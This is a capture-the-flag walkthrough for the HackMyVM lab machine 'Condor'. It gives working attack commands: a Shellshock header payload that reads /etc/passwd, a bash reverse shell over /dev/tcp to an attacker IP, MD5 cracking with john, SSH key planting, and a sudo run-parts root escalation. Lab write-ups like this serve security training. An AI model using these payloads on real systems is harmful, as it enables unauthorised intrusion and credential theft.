### Write up for https://hackmyvm.eu/machines/machine.php?vm=Condor ###

## Walkthrough



```bash
nmap -v -T4 -p- -sC -sV -oN nmap.log $ip  
```

```bash
firefox $ip
```
nothing special found on the website/source code etc

```bash
nikto -h $ip
```

something interesting here
```text
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
```

```bash
feroxbuster -n -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip -x php,txt,html,zip,bak,htm,cgi -t 100
```
nothing special 

lets check cgi-bin directory

```bash
feroxbuster -n -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/cgi-bin -x cgi,sh,bash,py -t 100 
```
we found c*.sh

using the following command
```bash
curl  server/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
```
we see some results

lets try to get reverse shell
```bash
nc -nlvp 5555 //on your main terminal
```

```bash
curl -H 'User-Agent: () { :; };/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1' http://10.10.10.50/cgi-bin/condor.sh   //on a new terminal
```


get Better shell envirorment 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

ctrl+z

```bash
stty -a
```

```bash
stty raw -echo;fg
```

```bash
export SHELL=bash
export TERM=xterm
stty rows (values from stty -a) cols (values from stty -a)
```


```bash
cd /home
```

found user paulo

there is a hiden file with some md5s

```bash
echo -n "paulo" | md5sum
```
*******c

```bash
cat TheHiddenFile | grep the md5sum
```

on a new terminal
```bash
echo "the findings from cat" >> paulo
```

```bash
john --wordlish=/usr/share/wordlist/rockyou.txt paulo
```
pass*****


back to the rs 

```bash
su paulo
```

```bash
mkdir .ssh
```

```bash
wget 10.10.10.10/id_rsa.pub -O authorized_keys
```
 
```bash
ssh $ip -l paulo
```


```bash
sudo -l
```

(ALL : ALL) NOPASSWD: /usr/bin/run-parts

Used https://gtfobins.github.io/ how to escalate

```bash
sudo run-parts --new-session --regex '^sh$' /bin
```
